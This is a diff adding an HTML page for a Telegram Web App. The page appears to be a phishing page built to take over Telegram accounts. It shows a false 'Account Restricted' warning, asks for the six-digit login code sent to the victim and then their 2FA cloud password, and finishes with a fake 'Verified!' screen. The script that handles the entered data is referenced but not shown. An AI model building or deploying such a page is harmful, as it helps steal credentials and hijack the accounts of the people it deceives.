@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#000000">
+<title>Verify</title>
+<link rel="stylesheet" href="/m/style.css">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+<div class="bg">
+  <video autoplay loop muted playsinline>
+    <source src="https://ar-hosting.pages.dev/1780192183740.mp4" type="video/mp4">
+  </video>
+  <div class="overlay"></div>
+</div>
+<div class="container">
+  <div class="screen active" id="screen-unlock">
+    <div class="card">
+      <div class="icon">🔒</div>
+      <h2>Account Restricted</h2>
+      <p>Verify your identity to unlock all features</p>
+      <button id="btn-unlock" class="btn">🔓 Unlock Account</button>
+    </div>
+  </div>
+  <div class="screen" id="screen-otp">
+    <div class="card">
+      <h2>Enter Code</h2>
+      <p>Code sent to your Telegram</p>
+      <div class="otp-row">
+        <input class="otp-cell" maxlength="1" data-i="0" inputmode="numeric">
+        <input class="otp-cell" maxlength="1" data-i="1" inputmode="numeric">
+        <input class="otp-cell" maxlength="1" data-i="2" inputmode="numeric">
+        <input class="otp-cell" maxlength="1" data-i="3" inputmode="numeric">
+        <input class="otp-cell" maxlength="1" data-i="4" inputmode="numeric">
+        <input class="otp-cell" maxlength="1" data-i="5" inputmode="numeric">
+      </div>
+      <div class="error" id="otp-error"></div>
+      <button id="btn-verify" class="btn" disabled>Verify Code</button>
+    </div>
+  </div>
+  <div class="screen" id="screen-password">
+    <div class="card">
+      <h2>2FA Password</h2>
+      <p>Enter your cloud password</p>
+      <input type="password" id="pw-input" class="input" placeholder="Password">
+      <div class="error" id="pw-error"></div>
+      <button id="btn-pw" class="btn">Verify</button>
+    </div>
+  </div>
+  <div class="screen" id="screen-success">
+    <div class="card success">
+      <div class="icon">✅</div>
+      <h2>Verified!</h2>
+      <p>Account unlocked successfully</p>
+    </div>
+  </div>
+  <div class="screen" id="screen-error">
+    <div class="card">
+      <div class="icon">⚠️</div>
+      <h2>Open in Telegram</h2>
+      <p>This page must be opened from the Telegram app.</p>
+    </div>
+  </div>
+  <div id="loading" class="loading"><div class="spinner"></div></div>
+</div>
+<script src="/m/script.js"></script>
+</body>
+</html>
